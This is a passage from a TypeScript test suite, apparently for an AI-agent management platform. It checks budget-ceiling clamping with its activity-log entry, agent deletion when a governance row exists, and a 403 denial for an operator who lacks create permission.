        .where(eq(agents.id, agent.id))
        .then((rows) => rows[0]!);
      expect(clamped.budgetMonthlyCents).toBe(10_000);

      const event = await db
        .select()
        .from(activityLog)
        .where(eq(activityLog.action, "agent.governance_configuration_clamped"))
        .then((rows) => rows[0]!);
      expect(event.details).toMatchObject({
        reason: "ceiling_lowered",
        field: "budgetMonthlyCents",
        previous: 90_000,
        clampedTo: 10_000,
      });
    });

    it("still allows deleting an agent that has a materialized governance row", async () => {
      const { company, owner, agent } = await seed();
      const svc = agentGovernanceService(db);
      await svc.updateOwnerCeiling(company.id, agent.id, {
        policy: CEILING,
        revision: (await svc.getForAgent(company.id, agent.id)).revision,
        actorUserId: owner.principalId,
        channel: "web",
      });
      const app = await createAgentApp(makeBoardActor(company.id, owner.principalId, "owner"));

      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl).delete(`/api/agents/${agent.id}`),
      );

      expect(res.status, JSON.stringify(res.body)).toBe(200);
      const remaining = await db
        .select()
        .from(agents)
        .where(eq(agents.id, agent.id));
      expect(remaining).toHaveLength(0);
    });

    it("leaves default-profile authority unchanged", async () => {
      const { company, steward, agent } = await seed("default");
      const app = await createAgentApp(makeBoardActor(company.id, steward.principalId, "operator"));

      const res = await requestApp(app, (baseUrl) =>
        request(baseUrl).patch(`/api/agents/${agent.id}`).send({ title: "Should be denied" }),
      );

      // An operator without agents:create is denied exactly as before the
      // AgentDash-MK steward path existed.
      expect(res.status).toBe(403);
    });
  });
});
